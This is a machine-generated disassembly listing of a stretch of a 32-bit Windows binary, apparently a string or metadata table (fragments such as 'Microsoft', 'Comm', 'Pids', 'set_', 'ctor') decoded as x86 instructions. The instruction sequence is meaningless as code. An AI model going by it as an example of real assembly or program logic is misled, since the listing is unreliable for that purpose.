  405d6f:	outs   dx,BYTE PTR ds:[esi]
  405d70:	inc    ebx
  405d71:	ins    DWORD PTR es:[edi],dx
  405d72:	fs inc ecx
  405d74:	jo     0x405de6
  405d76:	add    BYTE PTR [ebp+0x69],cl
  405d79:	arpl   WORD PTR [edx+0x6f],si
  405d7c:	jae    0x405ded
  405d7e:	data16 je 0x405daf
  405d81:	inc    ebx
  405d82:	outs   dx,DWORD PTR ds:[esi]
  405d83:	outs   dx,BYTE PTR ds:[esi]
  405d84:	arpl   WORD PTR [ebp+0x72],si
  405d87:	jb     0x405dee
  405d89:	outs   dx,BYTE PTR ds:[esi]
  405d8a:	arpl   WORD PTR [ecx+0x56],di
  405d8d:	imul   esi,DWORD PTR [ebx+0x75],0x7a696c61
  405d94:	gs jb  0x405dc5
  405d97:	inc    ebx
  405d98:	outs   dx,DWORD PTR ds:[esi]
  405d99:	ins    DWORD PTR es:[edi],dx
  405d9a:	ins    DWORD PTR es:[edi],dx
  405d9b:	popa   
  405d9c:	outs   dx,BYTE PTR ds:[esi]
  405d9d:	fs dec esp
  405d9f:	imul   ebp,DWORD PTR [esi+0x65],0x6f434900
  405da6:	ins    BYTE PTR es:[edi],dx
  405da7:	ins    BYTE PTR es:[edi],dx
  405da8:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405dad:	outs   dx,BYTE PTR ds:[esi]
  405dae:	inc    ebx
  405daf:	outs   dx,DWORD PTR ds:[esi]
  405db0:	ins    DWORD PTR es:[edi],dx
  405db1:	ins    DWORD PTR es:[edi],dx
  405db2:	popa   
  405db3:	outs   dx,BYTE PTR ds:[esi]
  405db4:	add    BYTE PTR fs:[ecx+0x74],al
  405db8:	je     0x405e1b
  405dba:	arpl   WORD PTR [eax+0x43],bp
  405dbd:	outs   dx,DWORD PTR ds:[esi]
  405dbe:	ins    DWORD PTR es:[edi],dx
  405dbf:	ins    DWORD PTR es:[edi],dx
  405dc0:	popa   
  405dc1:	outs   dx,BYTE PTR ds:[esi]
  405dc2:	add    BYTE PTR fs:[ebp+eiz*2+0x74],al
  405dc7:	popa   
  405dc8:	arpl   WORD PTR [eax+0x43],bp
  405dcb:	outs   dx,DWORD PTR ds:[esi]
  405dcc:	ins    DWORD PTR es:[edi],dx
  405dcd:	ins    DWORD PTR es:[edi],dx
  405dce:	popa   
  405dcf:	outs   dx,BYTE PTR ds:[esi]
  405dd0:	add    BYTE PTR fs:[ecx+eiz*2+0x75],cl
  405dd5:	outs   dx,BYTE PTR ds:[esi]
  405dd6:	arpl   WORD PTR [eax+0x43],bp
  405dd9:	outs   dx,DWORD PTR ds:[esi]
  405dda:	ins    DWORD PTR es:[edi],dx
  405ddb:	ins    DWORD PTR es:[edi],dx
  405ddc:	popa   
  405ddd:	outs   dx,BYTE PTR ds:[esi]
  405dde:	add    BYTE PTR fs:[ecx+0x75],dl
  405de2:	gs jb  0x405e5e
  405de5:	inc    ebx
  405de6:	outs   dx,DWORD PTR ds:[esi]
  405de7:	ins    DWORD PTR es:[edi],dx
  405de8:	ins    DWORD PTR es:[edi],dx
  405de9:	popa   
  405dea:	outs   dx,BYTE PTR ds:[esi]
  405deb:	add    BYTE PTR fs:[ecx+0x6e],al
  405def:	popa   
  405df0:	ins    BYTE PTR es:[edi],dx
  405df1:	jns    0x405e6d
  405df3:	gs inc ebx
  405df5:	outs   dx,DWORD PTR ds:[esi]
  405df6:	ins    DWORD PTR es:[edi],dx
  405df7:	ins    DWORD PTR es:[edi],dx
  405df8:	popa   
  405df9:	outs   dx,BYTE PTR ds:[esi]
  405dfa:	add    BYTE PTR fs:[ecx+0x6e],al
  405dfe:	popa   
  405dff:	ins    BYTE PTR es:[edi],dx
  405e00:	jns    0x405e7c
  405e02:	gs push eax
  405e04:	jb     0x405e75
  405e06:	addr16 jb 0x405e6e
  405e09:	jae    0x405e7e
  405e0b:	add    BYTE PTR [ebx+0x6f],al
  405e0e:	ins    BYTE PTR es:[edi],dx
  405e0f:	ins    BYTE PTR es:[edi],dx
  405e10:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405e15:	outs   dx,BYTE PTR ds:[esi]
  405e16:	inc    ebx
  405e17:	ins    DWORD PTR es:[edi],dx
  405e18:	fs inc ebp
  405e1a:	jb     0x405e8e
  405e1c:	outs   dx,DWORD PTR ds:[esi]
  405e1d:	jb     0x405e92
  405e1f:	add    BYTE PTR [ebx+0x6f],al
  405e22:	ins    BYTE PTR es:[edi],dx
  405e23:	ins    BYTE PTR es:[edi],dx
  405e24:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405e29:	outs   dx,BYTE PTR ds:[esi]
  405e2a:	inc    ebx
  405e2b:	ins    DWORD PTR es:[edi],dx
  405e2c:	fs push edx
  405e2e:	gs popa 
  405e30:	fs gs jb 0x405e34
  405e34:	inc    ebx
  405e35:	outs   dx,DWORD PTR ds:[esi]
  405e36:	ins    BYTE PTR es:[edi],dx
  405e37:	ins    BYTE PTR es:[edi],dx
  405e38:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405e3d:	outs   dx,BYTE PTR ds:[esi]
  405e3e:	inc    ebx
  405e3f:	ins    DWORD PTR es:[edi],dx
  405e40:	fs push edx
  405e42:	gs jae 0x405eba
  405e45:	ins    BYTE PTR es:[edi],dx
  405e46:	je     0x405e48
  405e48:	inc    ebx
  405e49:	outs   dx,DWORD PTR ds:[esi]
  405e4a:	ins    BYTE PTR es:[edi],dx
  405e4b:	ins    BYTE PTR es:[edi],dx
  405e4c:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405e51:	outs   dx,BYTE PTR ds:[esi]
  405e52:	push   eax
  405e53:	jb     0x405ec4
  405e55:	arpl   WORD PTR [ebp+0x73],sp
  405e58:	jae    0x405e9b
  405e5a:	jb     0x405ec3
  405e5c:	jne    0x405ecb
  405e5e:	outs   dx,BYTE PTR gs:[esi]
  405e60:	je     0x405e62
  405e62:	inc    ebx
  405e63:	outs   dx,DWORD PTR ds:[esi]
  405e64:	ins    BYTE PTR es:[edi],dx
  405e65:	ins    BYTE PTR es:[edi],dx
  405e66:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405e6b:	outs   dx,BYTE PTR ds:[esi]
  405e6c:	push   ebx
  405e6d:	gs jb  0x405ee6
  405e70:	imul   esp,DWORD PTR [ebx+0x65],0x616e614d
  405e77:	addr16 gs jb 0x405e7b
  405e7b:	inc    ebx
  405e7c:	ins    DWORD PTR es:[edi],dx
  405e7d:	fs push edx
  405e7f:	gs jae 0x405ef1
  405e82:	jne    0x405ef6
  405e84:	arpl   WORD PTR [ebp+0x73],sp
  405e87:	add    BYTE PTR [ebp+0x73],ch
  405e8a:	arpl   WORD PTR [edi+0x72],bp
  405e8d:	ins    BYTE PTR es:[edi],dx
  405e8e:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  405e95:	gs ins DWORD PTR es:[edi],dx
  405e97:	add    BYTE PTR [edi+0x62],cl
  405e9a:	push   0x65
  405e9c:	arpl   WORD PTR [eax+eax*1+0x49],si
  405ea0:	push   eax
  405ea1:	jb     0x405f12
  405ea3:	addr16 jb 0x405f0b
  405ea6:	jae    0x405f1b
  405ea8:	pusha  
  405ea9:	xor    DWORD PTR [eax],eax
  405eab:	dec    ebp
  405eac:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  405eb3:	je     0x405ee3
  405eb5:	inc    ebx
  405eb6:	outs   dx,DWORD PTR ds:[esi]
  405eb7:	outs   dx,BYTE PTR ds:[esi]
  405eb8:	arpl   WORD PTR [ebp+0x72],si
  405ebb:	jb     0x405f22
  405ebd:	outs   dx,BYTE PTR ds:[esi]
  405ebe:	arpl   WORD PTR [ecx+0x56],di
  405ec1:	imul   esi,DWORD PTR [ebx+0x75],0x7a696c61
  405ec8:	gs jb  0x405ecb
  405ecb:	dec    ebp
  405ecc:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  405ed3:	je     0x405f03
  405ed5:	inc    ebx
  405ed6:	outs   dx,DWORD PTR ds:[esi]
  405ed7:	outs   dx,BYTE PTR ds:[esi]
  405ed8:	arpl   WORD PTR [ebp+0x72],si
  405edb:	jb     0x405f42
  405edd:	outs   dx,BYTE PTR ds:[esi]
  405ede:	arpl   WORD PTR [ecx+0x56],di
  405ee1:	imul   esi,DWORD PTR [ebx+0x75],0x7a696c61
  405ee8:	gs jb  0x405f19
  405eeb:	inc    ebx
  405eec:	outs   dx,DWORD PTR ds:[esi]
  405eed:	ins    DWORD PTR es:[edi],dx
  405eee:	ins    DWORD PTR es:[edi],dx
  405eef:	outs   dx,DWORD PTR ds:[esi]
  405ef0:	outs   dx,BYTE PTR ds:[esi]
  405ef1:	add    BYTE PTR [eax+0x72],dl
  405ef4:	outs   dx,DWORD PTR ds:[esi]
  405ef5:	imul   bp,WORD PTR [ecx+ebp*2+0x6e],0x5067
  405efc:	jb     0x405f6d
  405efe:	addr16 jb 0x405f66
  405f01:	jae    0x405f76
  405f03:	push   eax
  405f04:	popa   
  405f05:	jb     0x405f68
  405f07:	ins    DWORD PTR es:[edi],dx
  405f08:	gs je  0x405f70
  405f0b:	jb     0x405f0d
  405f0d:	inc    ebp
  405f0e:	outs   dx,BYTE PTR ds:[esi]
  405f0f:	jne    0x405f7e
  405f11:	add    BYTE PTR [ebx+0x6f],al
  405f14:	ins    DWORD PTR es:[edi],dx
  405f15:	ins    DWORD PTR es:[edi],dx
  405f16:	popa   
  405f17:	outs   dx,BYTE PTR ds:[esi]
  405f18:	fs push edx
  405f1a:	gs popa 
  405f1c:	fs gs jb 0x405f20
  405f20:	dec    ebp
  405f21:	popa   
  405f22:	imul   ebp,DWORD PTR [esi+0x0],0x656e6547
  405f29:	jb     0x405f8c
  405f2b:	je     0x405f92
  405f2d:	dec    eax
  405f2e:	gs ins BYTE PTR es:[edi],dx
  405f30:	jo     0x405f85
  405f32:	je     0x405fa6
  405f34:	imul   ebp,DWORD PTR [esi+0x67],0x6e614800
  405f3b:	fs ins BYTE PTR es:[edi],dx
  405f3d:	gs inc ebx
  405f3f:	outs   dx,DWORD PTR ds:[esi]
  405f40:	ins    DWORD PTR es:[edi],dx
  405f41:	ins    DWORD PTR es:[edi],dx
  405f42:	popa   
  405f43:	outs   dx,BYTE PTR ds:[esi]
  405f44:	fs dec esp
  405f46:	imul   ebp,DWORD PTR [esi+0x65],0x6f727245
  405f4d:	jb     0x405f4f
  405f4f:	push   ebx
  405f50:	jns    0x405fc5
  405f52:	je     0x405fb9
  405f54:	ins    DWORD PTR es:[edi],dx
  405f55:	cs inc ebx
  405f57:	outs   dx,DWORD PTR ds:[esi]
  405f58:	ins    BYTE PTR es:[edi],dx
  405f59:	ins    BYTE PTR es:[edi],dx
  405f5a:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405f5f:	outs   dx,BYTE PTR ds:[esi]
  405f60:	jae    0x405f90
  405f62:	inc    edi
  405f63:	outs   dx,BYTE PTR gs:[esi]
  405f65:	gs jb  0x405fd1
  405f68:	arpl   WORD PTR [eax],ax
  405f6a:	dec    ecx
  405f6b:	inc    ebp
  405f6c:	outs   dx,BYTE PTR ds:[esi]
  405f6d:	jne    0x405fdc
  405f6f:	gs jb  0x405fd3
  405f72:	bound  ebp,QWORD PTR [ebp+eiz*2+0x60]
  405f76:	xor    DWORD PTR [eax],eax
  405f78:	inc    esp
  405f79:	imul   esi,DWORD PTR [ebx+0x70],0x5079616c
  405f80:	popa   
  405f81:	jb     0x405fe4
  405f83:	ins    DWORD PTR es:[edi],dx
  405f84:	gs je  0x405fec
  405f87:	jb     0x405ffc
  405f89:	dec    edi
  405f8a:	outs   dx,BYTE PTR ds:[esi]
  405f8b:	push   ebx
  405f8c:	popa   
  405f8d:	ins    DWORD PTR es:[edi],dx
  405f8e:	gs push esp
  405f90:	jns    0x406002
  405f92:	gs dec edi
  405f94:	inc    bp
  405f96:	jb     0x40600a
  405f98:	outs   dx,DWORD PTR ds:[esi]
  405f99:	jb     0x405f9b
  405f9b:	inc    edi
  405f9c:	gs je  0x405fe7
  405f9f:	gs popa 
  405fa1:	fs gs jb 0x405ff8
  405fa5:	je     0x406019
  405fa7:	imul   ebp,DWORD PTR [esi+0x67],0x65784500
  405fae:	arpl   WORD PTR [ebp+0x74],si
  405fb1:	add    BYTE PTR gs:[esi],ch
  405fb4:	arpl   WORD PTR [edi+ebp*2+0x72],si
  405fb8:	add    BYTE PTR [ebx+0x6f],al
  405fbb:	ins    BYTE PTR es:[edi],dx
  405fbc:	ins    BYTE PTR es:[edi],dx
  405fbd:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405fc2:	outs   dx,BYTE PTR ds:[esi]
  405fc3:	push   ebx
  405fc4:	je     0x406027
  405fc6:	je     0x40603d
  405fc8:	jae    0x405fca
  405fca:	dec    eax
  405fcb:	popa   
  405fcc:	outs   dx,BYTE PTR ds:[esi]
  405fcd:	fs ins BYTE PTR es:[edi],dx
  405fcf:	gs push ecx
  405fd1:	jne    0x406038
  405fd3:	jb     0x40604e
  405fd5:	push   edx
  405fd6:	gs jae 0x40604e
  405fd9:	ins    BYTE PTR es:[edi],dx
  405fda:	je     0x405fdc
  405fdc:	dec    esp
  405fdd:	outs   dx,DWORD PTR ds:[esi]
  405fde:	arpl   WORD PTR [ecx+0x6c],sp
  405fe1:	push   esp
  405fe2:	jb     0x406045
  405fe4:	arpl   WORD PTR [ebp+0x52],sp
  405fe7:	gs jo  0x406059
  405fea:	jb     0x406060
  405fec:	dec    ebp
  405fed:	outs   dx,DWORD PTR ds:[esi]
  405fee:	fs gs ins BYTE PTR es:[edi],dx
  405ff1:	add    BYTE PTR [ebx+0x65],dl
  405ff4:	je     0x40604a
  405ff6:	jb     0x406059
  405ff8:	arpl   WORD PTR [ebp+0x50],sp
  405ffb:	jb     0x40606c
  405ffd:	arpl   WORD PTR [ebp+0x73],sp
  406000:	jae    0x406067
  406002:	jae    0x406004
  406004:	inc    esp
  406005:	outs   dx,DWORD PTR ds:[esi]
  406006:	dec    esp
  406007:	imul   esi,DWORD PTR [ebx+0x74],0x73646950
  40600e:	add    BYTE PTR [ecx+ebp*2+0x73],cl
  406012:	je     0x406074
  406014:	xor    DWORD PTR [eax],eax
  406016:	inc    edi
  406017:	gs je  0x40605f
  40601a:	je     0x406093
  40601c:	inc    esi
  40601d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x50],0x73687461
  406025:	add    BYTE PTR [eax+0x72],dl
  406028:	outs   dx,DWORD PTR ds:[esi]
  406029:	imul   bp,WORD PTR [ecx+ebp*2+0x6e],0x5067
  406030:	jb     0x4060a1
  406032:	addr16 jb 0x40609a
  406035:	jae    0x4060aa
  406037:	push   ebx
  406038:	je     0x40609b
  40603a:	je     0x4060a1
  40603c:	add    BYTE PTR [ecx+eiz*2+0x73],ch
  406040:	je     0x406095
  406042:	je     0x4060a5
  406044:	je     0x4060ab
  406046:	add    BYTE PTR [ecx+eiz*2+0x73],ch
  40604a:	je     0x40609c
  40604c:	gs jb  0x4060b2
  40604f:	outs   dx,BYTE PTR gs:[esi]
  406051:	je     0x4060b4
  406053:	add    BYTE PTR gs:[si+0x69],al
  406058:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  40605c:	outs   dx,BYTE PTR ds:[esi]
  40605d:	popa   
  40605e:	jb     0x4060d9
  406060:	pusha  
  406061:	xor    al,BYTE PTR [eax]
  406063:	jo     0x4060d7
  406065:	outs   dx,DWORD PTR ds:[esi]
  406066:	addr16 jb 0x4060ce
  406069:	jae    0x4060de
  40606b:	push   ebx
  40606c:	je     0x4060cf
  40606e:	je     0x4060d5
  406070:	push   esp
  406071:	gs js  0x4060e8
  406074:	dec    esp
  406075:	outs   dx,DWORD PTR ds:[esi]
  406076:	outs   dx,DWORD PTR ds:[esi]
  406077:	imul   esi,DWORD PTR [ebp+0x70],0x0
  40607b:	push   edx
  40607c:	gs jo  0x4060ee
  40607f:	jb     0x4060f5
  406081:	add    BYTE PTR [esi+0x61],dh
  406084:	ins    BYTE PTR es:[edi],dx
  406085:	jne    0x4060ec
  406087:	pop    edi
  406088:	pop    edi
  406089:	add    BYTE PTR [esi+0x6f],cl
  40608c:	outs   dx,BYTE PTR ds:[esi]
  40608d:	add    BYTE PTR gs:[ecx+0x6e],cl
  406091:	jbe    0x4060f4
  406093:	ins    BYTE PTR es:[edi],dx
  406094:	imul   esp,DWORD PTR [esi+ecx*2+0x6f],0x6d6d6f43
  40609c:	popa   
  40609d:	outs   dx,BYTE PTR ds:[esi]
  40609e:	fs push eax
  4060a0:	popa   
  4060a1:	jb     0x406104
  4060a3:	ins    DWORD PTR es:[edi],dx
  4060a4:	jae    0x4060a6
  4060a6:	dec    ecx
  4060a7:	outs   dx,BYTE PTR ds:[esi]
  4060a8:	jbe    0x40610b
  4060aa:	ins    BYTE PTR es:[edi],dx
  4060ab:	imul   esp,DWORD PTR [ebx+eax*2+0x6f],0x6e69626d
  4060b3:	popa   
  4060b4:	je     0x40611f
  4060b6:	outs   dx,DWORD PTR ds:[esi]
  4060b7:	outs   dx,BYTE PTR ds:[esi]
  4060b8:	inc    ebx
  4060b9:	outs   dx,DWORD PTR ds:[esi]
  4060ba:	ins    DWORD PTR es:[edi],dx
  4060bb:	ins    DWORD PTR es:[edi],dx
  4060bc:	popa   
  4060bd:	outs   dx,BYTE PTR ds:[esi]
  4060be:	fs push eax
  4060c0:	popa   
  4060c1:	jb     0x406124
  4060c3:	ins    DWORD PTR es:[edi],dx
  4060c4:	jae    0x4060c6
  4060c6:	dec    ecx
  4060c7:	outs   dx,BYTE PTR ds:[esi]
  4060c8:	jbe    0x40612b
  4060ca:	ins    BYTE PTR es:[edi],dx
  4060cb:	imul   esp,DWORD PTR [ebp+edx*2+0x73],0x75614c65
  4060d3:	outs   dx,BYTE PTR ds:[esi]
  4060d4:	arpl   WORD PTR [eax+0x41],bp
  4060d7:	jb     0x406140
  4060d9:	jae    0x4060db
  4060db:	dec    ecx
  4060dc:	outs   dx,BYTE PTR ds:[esi]
  4060dd:	jbe    0x406140
  4060df:	ins    BYTE PTR es:[edi],dx
  4060e0:	imul   esp,DWORD PTR [ebp+edx*2+0x73],0x6f725065
  4060e8:	arpl   WORD PTR [ebp+0x73],sp
  4060eb:	jae    0x40612e
  4060ed:	jb     0x406156
  4060ef:	add    BYTE PTR [ebx+0x6c],dl
  4060f2:	popa   
  4060f3:	jae    0x40615d
  4060f5:	push   eax
  4060f6:	jb     0x40615d
  4060f8:	imul   di,WORD PTR [eax+0x50],0x7261
  4060fe:	popa   
  4060ff:	ins    DWORD PTR es:[edi],dx
  406100:	gs je  0x406168
  406103:	jb     0x406105
  406105:	addr16 gs je 0x406168
  406109:	inc    ebx
  40610a:	outs   dx,DWORD PTR ds:[esi]
  40610b:	ins    DWORD PTR es:[edi],dx
  40610c:	ins    DWORD PTR es:[edi],dx
  40610d:	popa   
  40610e:	outs   dx,BYTE PTR ds:[esi]
  40610f:	add    BYTE PTR fs:[ebx+0x65],dh
  406113:	je     0x406174
  406115:	inc    ebx
  406116:	outs   dx,DWORD PTR ds:[esi]
  406117:	ins    DWORD PTR es:[edi],dx
  406118:	ins    DWORD PTR es:[edi],dx
  406119:	popa   
  40611a:	outs   dx,BYTE PTR ds:[esi]
  40611b:	add    BYTE PTR fs:[edi+0x65],ah
  40611f:	je     0x406180
  406121:	inc    ebx
  406122:	outs   dx,DWORD PTR ds:[esi]
  406123:	ins    BYTE PTR es:[edi],dx
  406124:	ins    BYTE PTR es:[edi],dx
  406125:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40612a:	outs   dx,BYTE PTR ds:[esi]
  40612b:	push   eax
  40612c:	popa   
  40612d:	jb     0x406190
  40612f:	ins    DWORD PTR es:[edi],dx
  406130:	gs je  0x406198
  406133:	jb     0x40617a
  406135:	jb     0x4061a9
  406137:	outs   dx,DWORD PTR ds:[esi]
  406138:	jb     0x4061ad
  40613a:	add    BYTE PTR [ebx+0x65],dh
  40613d:	je     0x40619e
  40613f:	inc    ebx
  406140:	outs   dx,DWORD PTR ds:[esi]
  406141:	ins    BYTE PTR es:[edi],dx
  406142:	ins    BYTE PTR es:[edi],dx
  406143:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406148:	outs   dx,BYTE PTR ds:[esi]
  406149:	push   eax
  40614a:	popa   
  40614b:	jb     0x4061ae
  40614d:	ins    DWORD PTR es:[edi],dx
  40614e:	gs je  0x4061b6
  406151:	jb     0x406198
  406153:	jb     0x4061c7
  406155:	outs   dx,DWORD PTR ds:[esi]
  406156:	jb     0x4061cb
  406158:	add    BYTE PTR [edx+0x65],dl
  40615b:	popa   
  40615c:	fs inc ebx
  40615e:	outs   dx,DWORD PTR ds:[esi]
  40615f:	ins    DWORD PTR es:[edi],dx
  406160:	ins    DWORD PTR es:[edi],dx
  406161:	popa   
  406162:	outs   dx,BYTE PTR ds:[esi]
  406163:	fs inc ebp
  406165:	jb     0x4061d9
  406167:	outs   dx,DWORD PTR ds:[esi]
  406168:	jb     0x4061dd
  40616a:	add    BYTE PTR [edi+0x65],ah
  40616d:	je     0x4061ce
  40616f:	inc    edi
  406170:	outs   dx,BYTE PTR gs:[esi]
  406172:	gs jb  0x4061d6
  406175:	ins    BYTE PTR es:[edi],dx
  406176:	push   eax
  406177:	popa   
  406178:	jb     0x4061ed
  40617a:	imul   ebp,DWORD PTR [esi+0x67],0x6f727245
  406181:	jb     0x4061f6
  406183:	add    BYTE PTR [ebx+0x65],dh
  406186:	je     0x4061e7
  406188:	inc    edi
  406189:	outs   dx,BYTE PTR gs:[esi]
  40618b:	gs jb  0x4061ef
  40618e:	ins    BYTE PTR es:[edi],dx
  40618f:	push   eax
  406190:	popa   
  406191:	jb     0x406206
  406193:	imul   ebp,DWORD PTR [esi+0x67],0x6f727245
  40619a:	jb     0x40620f
  40619c:	add    BYTE PTR [edi+0x65],ah
  40619f:	je     0x406200
  4061a1:	dec    ecx
  4061a2:	jae    0x4061f5
  4061a4:	jne    0x40620b
  4061a6:	jb     0x406221
  4061a8:	inc    ebx
  4061a9:	outs   dx,DWORD PTR ds:[esi]
  4061aa:	ins    DWORD PTR es:[edi],dx
  4061ab:	ins    DWORD PTR es:[edi],dx
  4061ac:	popa   
  4061ad:	outs   dx,BYTE PTR ds:[esi]
  4061ae:	add    BYTE PTR fs:[ebx+0x65],dh
  4061b2:	je     0x406213
  4061b4:	dec    ecx
  4061b5:	jae    0x406208
  4061b7:	jne    0x40621e
  4061b9:	jb     0x406234
  4061bb:	inc    ebx
  4061bc:	outs   dx,DWORD PTR ds:[esi]
  4061bd:	ins    DWORD PTR es:[edi],dx
  4061be:	ins    DWORD PTR es:[edi],dx
  4061bf:	popa   
  4061c0:	outs   dx,BYTE PTR ds:[esi]
  4061c1:	add    BYTE PTR fs:[edi+0x65],ah
  4061c5:	je     0x406226
  4061c7:	dec    ecx
  4061c8:	jae    0x40620e
  4061ca:	gs je  0x40622e
  4061cd:	arpl   WORD PTR [eax+0x43],bp
  4061d0:	outs   dx,DWORD PTR ds:[esi]
  4061d1:	ins    DWORD PTR es:[edi],dx
  4061d2:	ins    DWORD PTR es:[edi],dx
  4061d3:	popa   
  4061d4:	outs   dx,BYTE PTR ds:[esi]
  4061d5:	add    BYTE PTR fs:[ebx+0x65],dh
  4061d9:	je     0x40623a
  4061db:	dec    ecx
  4061dc:	jae    0x406222
  4061de:	gs je  0x406242
  4061e1:	arpl   WORD PTR [eax+0x43],bp
  4061e4:	outs   dx,DWORD PTR ds:[esi]
  4061e5:	ins    DWORD PTR es:[edi],dx
  4061e6:	ins    DWORD PTR es:[edi],dx
  4061e7:	popa   
  4061e8:	outs   dx,BYTE PTR ds:[esi]
  4061e9:	add    BYTE PTR fs:[edi+0x65],ah
  4061ed:	je     0x40624e
  4061ef:	dec    ecx
  4061f0:	jae    0x40623e
  4061f2:	popa   
  4061f3:	jne    0x406263
  4061f5:	arpl   WORD PTR [eax+0x43],bp
  4061f8:	outs   dx,DWORD PTR ds:[esi]
  4061f9:	ins    DWORD PTR es:[edi],dx
  4061fa:	ins    DWORD PTR es:[edi],dx
  4061fb:	popa   
  4061fc:	outs   dx,BYTE PTR ds:[esi]
  4061fd:	add    BYTE PTR fs:[ebx+0x65],dh
  406201:	je     0x406262
  406203:	dec    ecx
  406204:	jae    0x406252
  406206:	popa   
  406207:	jne    0x406277
  406209:	arpl   WORD PTR [eax+0x43],bp
  40620c:	outs   dx,DWORD PTR ds:[esi]
  40620d:	ins    DWORD PTR es:[edi],dx
  40620e:	ins    DWORD PTR es:[edi],dx
  40620f:	popa   
  406210:	outs   dx,BYTE PTR ds:[esi]
  406211:	add    BYTE PTR fs:[edi+0x65],ah
  406215:	je     0x406276
  406217:	dec    ecx
  406218:	jae    0x40625b
  40621a:	je     0x406290
  40621c:	popa   
  40621d:	arpl   WORD PTR [eax+0x43],bp
  406220:	outs   dx,DWORD PTR ds:[esi]
  406221:	ins    DWORD PTR es:[edi],dx
  406222:	ins    DWORD PTR es:[edi],dx
  406223:	popa   
  406224:	outs   dx,BYTE PTR ds:[esi]
  406225:	add    BYTE PTR fs:[ebx+0x65],dh
  406229:	je     0x40628a
  40622b:	dec    ecx
  40622c:	jae    0x40626f
  40622e:	je     0x4062a4
  406230:	popa   
  406231:	arpl   WORD PTR [eax+0x43],bp
  406234:	outs   dx,DWORD PTR ds:[esi]
  406235:	ins    DWORD PTR es:[edi],dx
  406236:	ins    DWORD PTR es:[edi],dx
  406237:	popa   
  406238:	outs   dx,BYTE PTR ds:[esi]
  406239:	add    BYTE PTR fs:[edi+0x65],ah
  40623d:	je     0x40629e
  40623f:	dec    ecx
  406240:	jae    0x406283
  406242:	outs   dx,BYTE PTR ds:[esi]
  406243:	popa   
  406244:	ins    BYTE PTR es:[edi],dx
  406245:	jns    0x4062c1
  406247:	gs inc ebx
  406249:	outs   dx,DWORD PTR ds:[esi]
  40624a:	ins    DWORD PTR es:[edi],dx
  40624b:	ins    DWORD PTR es:[edi],dx
  40624c:	popa   
  40624d:	outs   dx,BYTE PTR ds:[esi]
  40624e:	add    BYTE PTR fs:[ebx+0x65],dh
  406252:	je     0x4062b3
  406254:	dec    ecx
  406255:	jae    0x406298
  406257:	outs   dx,BYTE PTR ds:[esi]
  406258:	popa   
  406259:	ins    BYTE PTR es:[edi],dx
  40625a:	jns    0x4062d6
  40625c:	gs inc ebx
  40625e:	outs   dx,DWORD PTR ds:[esi]
  40625f:	ins    DWORD PTR es:[edi],dx
  406260:	ins    DWORD PTR es:[edi],dx
  406261:	popa   
  406262:	outs   dx,BYTE PTR ds:[esi]
  406263:	add    BYTE PTR fs:[edi+0x65],ah
  406267:	je     0x4062c8
  406269:	dec    esp
  40626a:	popa   
  40626b:	jne    0x4062db
  40626d:	arpl   WORD PTR [eax+0x45],bp
  406270:	js     0x4062d7
  406272:	add    BYTE PTR [ebx+0x65],dh
  406275:	je     0x4062d6
  406277:	dec    esp
  406278:	popa   
  406279:	jne    0x4062e9
  40627b:	arpl   WORD PTR [eax+0x45],bp
  40627e:	js     0x4062e5
  406280:	add    BYTE PTR [edi+0x65],ah
  406283:	je     0x4062e4
  406285:	dec    esp
  406286:	popa   
  406287:	jne    0x4062f7
  406289:	arpl   WORD PTR [eax+0x41],bp
  40628c:	jb     0x4062f5
  40628e:	jae    0x406290
  406290:	jae    0x4062f7
  406292:	je     0x4062f3
  406294:	dec    esp
  406295:	popa   
  406296:	jne    0x406306
  406298:	arpl   WORD PTR [eax+0x41],bp
  40629b:	jb     0x406304
  40629d:	jae    0x40629f
  40629f:	addr16 gs je 0x406302
  4062a3:	push   eax
  4062a4:	jb     0x406315
  4062a6:	arpl   WORD PTR [ebp+0x73],sp
  4062a9:	jae    0x4062ec
  4062ab:	jb     0x406314
  4062ad:	add    BYTE PTR [ebx+0x65],dh
  4062b0:	je     0x406311
  4062b2:	push   eax
  4062b3:	jb     0x406324
  4062b5:	arpl   WORD PTR [ebp+0x73],sp
  4062b8:	jae    0x4062fb
  4062ba:	jb     0x406323
  4062bc:	add    BYTE PTR [edi+0x65],ah
  4062bf:	je     0x406320
  4062c1:	inc    ecx
  4062c2:	outs   dx,BYTE PTR ds:[esi]
  4062c3:	popa   
  4062c4:	ins    BYTE PTR es:[edi],dx
  4062c5:	jns    0x406341
  4062c7:	gs push esp
  4062c9:	jb     0x40632c
  4062cb:	arpl   WORD PTR [ebp+0x46],sp
  4062ce:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x5f746573
  4062d6:	inc    ecx
  4062d7:	outs   dx,BYTE PTR ds:[esi]
  4062d8:	popa   
  4062d9:	ins    BYTE PTR es:[edi],dx
  4062da:	jns    0x406356
  4062dc:	gs push esp
  4062de:	jb     0x406341
  4062e0:	arpl   WORD PTR [ebp+0x46],sp
  4062e3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x5f746567
  4062eb:	dec    edi
  4062ec:	jne    0x406362
  4062ee:	jo     0x406365
  4062f0:	je     0x406336
  4062f2:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4062f9:	jns    0x4062fb
  4062fb:	jae    0x406362
  4062fd:	je     0x40635e
  4062ff:	dec    edi
  406300:	jne    0x406376
  406302:	jo     0x406379
  406304:	je     0x40634a
  406306:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  40630d:	jns    0x40630f
  40630f:	dec    esp
  406310:	outs   dx,DWORD PTR ds:[esi]
  406311:	arpl   WORD PTR [ecx+0x6c],sp
  406314:	inc    ebx
  406315:	outs   dx,DWORD PTR ds:[esi]
  406316:	outs   dx,BYTE PTR ds:[esi]
